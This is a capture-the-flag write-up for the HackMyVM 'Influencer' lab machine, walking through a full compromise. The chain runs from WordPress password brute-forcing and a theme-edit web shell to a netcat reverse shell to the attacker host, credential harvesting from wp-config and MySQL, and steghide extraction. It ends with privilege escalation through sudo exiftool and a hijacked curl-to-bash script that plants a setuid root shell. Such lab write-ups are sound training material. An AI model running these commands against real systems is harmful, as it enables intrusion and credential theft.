# Influencer

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.166:2121
Open 10.0.2.166:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.166
PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2121/tcp open  ftp     syn-ack vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.0.2.149
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0           11113 Jun 09  2023 facebook.jpg
| -rw-r--r--    1 0        0           35427 Jun 09  2023 github.jpg
| -rw-r--r--    1 0        0           88816 Jun 09  2023 instagram.jpg
| -rw-r--r--    1 0        0           27159 Jun 09  2023 linkedin.jpg
| -rw-r--r--    1 0        0              28 Jun 08  2023 note.txt
|_-rw-r--r--    1 0        0          124263 Jun 09  2023 snapchat.jpg
Service Info: OS: Unix
```
:::

## FTP (2121)

Can download file, but not  upload
```bash
â””â”€$ ftp anonymous@10.0.2.166 -p 2121
ftp> ls
-rw-r--r--    1 0        0           11113 Jun 09  2023 facebook.jpg
-rw-r--r--    1 0        0           35427 Jun 09  2023 github.jpg
-rw-r--r--    1 0        0           88816 Jun 09  2023 instagram.jpg
-rw-r--r--    1 0        0           27159 Jun 09  2023 linkedin.jpg
-rw-r--r--    1 0        0              28 Jun 08  2023 note.txt
-rw-r--r--    1 0        0          124263 Jun 09  2023 snapchat.jpg
ftp> get note.txt
226 Transfer complete.
ftp> put nmap_scan_10.0.2.166
550 Permission denied.
ftp> exit
```

```bash
â””â”€$ cat note.txt
- Change wordpress password
```

## HTTP

![writeup.png](/assets/pentest/hackmyvm/influencer/writeup.png)

### Password Bruteforce

![writeup-1.png](/assets/pentest/hackmyvm/influencer/writeup-1.png)

![writeup-2.png](/assets/pentest/hackmyvm/influencer/writeup-2.png)

```bash
â””â”€$ ffuf -u 'http://10.0.2.166/wordpress/wp-login.php' -d 'log=luna&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.2.166%2Fwordpress%2Fwp-admin%2F&testcookie=1' -w luna.txt -mc all -H 'Content-Type: application/x-www-form-urlencoded' -b 'wordpress_test_cookie=WP%20Cookie%20check' -mc 302
luna_1997               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1702ms]
```

::: info Note
`luna:luna_1997`
:::

### RCE

Edit theme

![writeup-3.png](/assets/pentest/hackmyvm/influencer/writeup-3.png)

Get shell
```bash
â””â”€$ curl 'http://10.0.2.166/wordpress/index.php/letmein' --data-urlencode '0=busybox nc 10.0.2.149 4444 -e /bin/bash'
---
â””â”€$ penelope -p 4444
www-data@influencer:/var/www/html/wordpress$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Database config
```bash
www-data@influencer:/var/www/html/wordpress$ cat wp-config.php | grep define
define( 'DB_NAME', 'wordpressdb' );
define( 'DB_USER', 'www-data' );
define( 'DB_PASSWORD', 's3cret' );
...
```

Users
```bash
www-data@influencer:/var/www/html/wordpress$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
luna:x:1000:1000:Luna Shine:/home/luna:/bin/bash
juan:x:1001:1001:juan,,,:/home/juan:/bin/bash
```

ha?
```bash
www-data@influencer:/var/www/html/wordpress$ su - juan -c id
Command 'su' not found, but can be installed with:
apt install util-linux
Please ask your administrator.
```

SSH is open locally
```bash
www-data@influencer:/var/www/html/wordpress$ ss -tunlp4
Netid   State    Recv-Q   Send-Q         Local Address:Port     Peer Address:Port   Process
udp     UNCONN   0        0              127.0.0.53%lo:53            0.0.0.0:*
udp     UNCONN   0        0          10.0.2.166%enp0s3:68            0.0.0.0:*
tcp     LISTEN   0        32                   0.0.0.0:2121          0.0.0.0:*
tcp     LISTEN   0        80                 127.0.0.1:3306          0.0.0.0:*
tcp     LISTEN   0        4096           127.0.0.53%lo:53            0.0.0.0:*
tcp     LISTEN   0        128                127.0.0.1:1212          0.0.0.0:*
www-data@influencer:/var/www/html/wordpress$ nc -v 0 1212
Connection to 0 (0.0.0.0) 1212 port [tcp/*] succeeded!
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
```

I tried both passwords for both users, but unsuccessful. Wordpress has already known password.
```bash
www-data@influencer:/tmp$ mysql -u'www-data' -p's3cret' 'wordpressdb' -e 'SELECT * FROM wp_users \G'
*************************** 1. row ***************************
                 ID: 1
         user_login: luna
          user_pass: $wp$2y$10$FZxXTC8Srad5MpeNYxsmC.vJNmqxmN984psFHxpwypL2s3zAW81K6
      user_nicename: luna
         user_email: luna@blog.hmv
           user_url: http://192.168.1.167/wordpress
    user_registered: 2023-06-08 15:34:54
user_activation_key:
        user_status: 0
       display_name: luna
```

## FTP (Stego)

```bash
â””â”€$ wget -m ftp://anonymous:@10.0.2.166:2121
â””â”€$ cd 10.0.2.166:2121
â””â”€$ exiftool *.jpg
#Nothing
```

Double check for steganography with empty password
```bash
â””â”€$ steghide extract -sf facebook.jpg -p ''
steghide: could not extract any data with that passphrase!

â””â”€$ steghide extract -sf github.jpg -p ''
steghide: could not extract any data with that passphrase!

â””â”€$ steghide extract -sf instagram.jpg -p ''
steghide: could not extract any data with that passphrase!

â””â”€$ steghide extract -sf linkedin.jpg -p ''
steghide: could not extract any data with that passphrase!

â””â”€$ steghide extract -sf snapchat.jpg -p ''
wrote extracted data to "backup.txt".

â””â”€$ cat backup.txt
PASSWORD BACKUP
---------------
u3jkeg97gf
```

ðŸ˜”

## SSH (Internal)

::: info Note
`luna:u3jkeg97gf`
:::

```bash
www-data@influencer:/tmp$ ssh 0 -p 1212 -l luna
luna@influencer:~$ id
uid=1000(luna) gid=1000(luna) groups=1000(luna),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
```

## Privilege Escalation

```bash
luna@influencer:~$ sudo -l
Matching Defaults entries for luna on influencer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luna may run the following commands on influencer:
    (juan) NOPASSWD: /usr/bin/exiftool
```

- [https://gtfobins.github.io/gtfobins/exiftool/](https://gtfobins.github.io/gtfobins/exiftool/)

```bash
luna@influencer:~$ sudo -u juan exiftool -filename=/tmp/passwd /etc/passwd
Warning: Error removing old file - /etc/passwd
    1 image files updated
luna@influencer:~$ grep sh$ /tmp/passwd
root:x:0:0:root:/root:/bin/bash
luna:x:1000:1000:Luna Shine:/home/luna:/bin/bash
juan:x:1001:1001:juan,,,:/home/juan:/bin/bash
```

```bash
luna@influencer:/tmp$ ssh-keygen -f id_rsa -P x -q
luna@influencer:/tmp$ sudo -u juan exiftool -filename=/home/juan/.ssh/authorized_keys /tmp/id_rsa.pub
Warning: Error removing old file - /tmp/id_rsa.pub
    1 image files updated
```

```bash
luna@influencer:/tmp$ ssh 0 -i id_rsa -p 1212 -l juan
juan@influencer:~$ id
uid=1001(juan) gid=1001(juan) groups=1001(juan)
```

### User.txt

```
juan@influencer:~$ cat user.txt
goodjobbro
```

## Privilege Escalation

```bash
juan@influencer:~$ sudo -l
Matching Defaults entries for juan on influencer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User juan may run the following commands on influencer:
    (root) NOPASSWD: /bin/bash /home/juan/check.sh
```

The script `curl`s file on a server and executes with bash
```bash
juan@influencer:~$ cat /home/juan/check.sh
#!/bin/bash
/usr/bin/curl http://server.hmv/98127651 | /bin/bash
```

`server.hmv` is bind to `localhost`
```bash
juan@influencer:~$ cat /etc/hosts
...
127.0.0.1 server.hmv
```

ðŸ¤” file is not writable
```bash
juan@influencer:~$ ls -al /var/www/html/
total 28
drwxr-xr-x 3 root     root      4096 jun  8  2023 .
drwxr-xr-x 3 root     root      4096 jun  8  2023 ..
-rw-r--r-- 1 root     juan       105 jun  8  2023 98127651
-rw-r--r-- 1 root     root     10671 jun  8  2023 index.html
drwxr-xr-x 5 www-data www-data  4096 ene  2 18:52 wordpress

juan@influencer:~$ cat /var/www/html/98127651
#!/bin/bash
/usr/bin/echo "[+] Checking server..."
/usr/bin/sleep 2
/usr/bin/echo "[*] Check Completed"
```

`hosts` is writable!!!
```bash
juan@influencer:/var/www/html$ ls -l /etc/hosts
-rw-rw-rw- 1 root juan 247 jun  8  2023 /etc/hosts
```

```bash
juan@influencer:/var/www/html$ nano /etc/hosts
...
10.0.2.149 server.hmv
```

```bash
â””â”€$ echo 'install -m4777 /bin/bash /tmp/rootbash' > 98127651
â””â”€$ serve
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
---
juan@influencer:/var/www/html$ sudo /bin/bash /home/juan/check.sh
---
juan@influencer:/var/www/html$ /tmp/rootbash -p
rootbash-5.1# id
uid=1001(juan) gid=1001(juan) euid=0(root) groups=1001(juan)
```

### Root.txt

```bash
rootbash-5.1# cat /root/rr00t.txt
19283712487912
```